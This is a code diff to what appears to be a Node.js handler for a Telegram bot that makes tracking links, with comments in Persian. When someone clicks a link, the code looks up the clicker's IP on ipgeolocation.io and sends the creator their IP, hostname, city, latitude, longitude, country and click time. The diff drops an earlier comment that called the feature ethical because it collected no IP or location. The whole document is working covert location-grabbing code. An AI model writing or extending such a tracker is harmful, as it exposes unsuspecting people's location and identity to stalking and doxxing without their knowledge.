@@ -111,59 +111,52 @@ module.exports = async (req, res) => {
         // console.log(`IP: ${privateUserIP} | ${privateUserAgent}`)
         //  fetch('https://api.ipify.org?format=json')
         //     .then(res => res.json()).then(s => console.log(s))
-        // ۲. ارسال اعلان به خالق لینک
-        // از آنجایی که نیاز به IP یا موقعیت مکانی نداریم، این عملیات اخلاقی است
-        bot.api.sendMessage(
+        // ۲. ارسال اعلان اولیه به خالق لینک
+        await bot.api.sendMessage(
             creatorId, 
-            `🔔 اعلان کلیک! شخصی روی لینک شما (${linkId}) کلیک کرد.`
+            `🔔 اعلان کلیک! شخصی روی لینک شما (${linkId}) کلیک کرد.\n⏳ در حال دریافت اطلاعات موقعیت مکانی...`
         ).catch(e => console.error("Error sending notification:", e));
         
-        fetch(`https://ipgeolocation.io/what-is-my-ip/${userInfo.ip}`)
-            .then(res => res.text())
-            .then(s => {
-                const $ = load(s);
-                console.log("before send ip to geoip site");
-                const dataStr = $("#code-json").attr("data-full");
-                console.log("Raw data:", dataStr);
+        // ۳. دریافت و ارسال اطلاعات موقعیت مکانی
+        try {
+            const geoResponse = await fetch(`https://ipgeolocation.io/what-is-my-ip/${userInfo.ip}`);
+            const htmlContent = await geoResponse.text();
+            const $ = load(htmlContent);
+            
+            console.log("Fetching geolocation data...");
+            const dataStr = $("#code-json").attr("data-full");
+            console.log("Raw data:", dataStr);
+            
+            if (dataStr) {
+                const data = JSON.parse(dataStr);
+                console.log("Parsed data:", data);
                 
-                if (dataStr) {
-                    try {
-                        const data = JSON.parse(dataStr);
-                        console.log("Parsed data:", data);
-                        
-                        bot.api.sendMessage(
-                            creatorId,
-                            `📍 اطلاعات موقعیت مکانی:
+                await bot.api.sendMessage(
+                    creatorId,
+                    `📍 اطلاعات موقعیت مکانی:
 🌐 IP: ${data.ip || 'N/A'}
 🖥 Hostname: ${data.hostname || 'N/A'}
 🏙 شهر: ${data.location?.city || 'N/A'}
 📍 عرض جغرافیایی: ${data.location?.latitude || 'N/A'}
 📍 طول جغرافیایی: ${data.location?.longitude || 'N/A'}
 🏳 کد کشور: ${data.location?.country_code2 || 'N/A'}
-🌍 نام کشور: ${data.location?.country_name || 'N/A'}`
-                        ).catch(e => console.error("Error sending location message:", e));
-                    } catch (parseError) {
-                        console.error("Error parsing data-full attribute:", parseError);
-                        bot.api.sendMessage(
-                            creatorId,
-                            `⚠️ خطا در دریافت اطلاعات موقعیت مکانی\nIP: ${userInfo.ip}`
-                        ).catch(e => console.error("Error sending error message:", e));
-                    }
-                } else {
-                    console.error("data-full attribute not found");
-                    bot.api.sendMessage(
-                        creatorId,
-                        `⚠️ اطلاعات موقعیت مکانی یافت نشد\nIP: ${userInfo.ip}`
-                    ).catch(e => console.error("Error sending fallback message:", e));
-                }
-            })
-            .catch(fetchError => {
-                console.error("Error fetching geolocation:", fetchError);
-                bot.api.sendMessage(
+🌍 نام کشور: ${data.location?.country_name || 'N/A'}
+⏰ زمان: ${userInfo.timestamp}`
+                );
+            } else {
+                console.error("data-full attribute not found");
+                await bot.api.sendMessage(
                     creatorId,
-                    `⚠️ خطا در دریافت اطلاعات موقعیت مکانی\nIP: ${userInfo.ip}`
-                ).catch(e => console.error("Error sending error message:", e));
-            });
+                    `⚠️ اطلاعات موقعیت مکانی یافت نشد\n🌐 IP: ${userInfo.ip}\n⏰ زمان: ${userInfo.timestamp}`
+                );
+            }
+        } catch (error) {
+            console.error("Error fetching geolocation:", error);
+            await bot.api.sendMessage(
+                creatorId,
+                `⚠️ خطا در دریافت اطلاعات موقعیت مکانی\n🌐 IP: ${userInfo.ip}\n⏰ زمان: ${userInfo.timestamp}`
+            ).catch(e => console.error("Error sending error message:", e));
+        }
 
         // ۴. تمدید زمان انقضای لینک (هر بار که استفاده میشه، 10 دقیقه دیگه فعال میمونه)
         await DB.renewLink(linkId, creatorId);
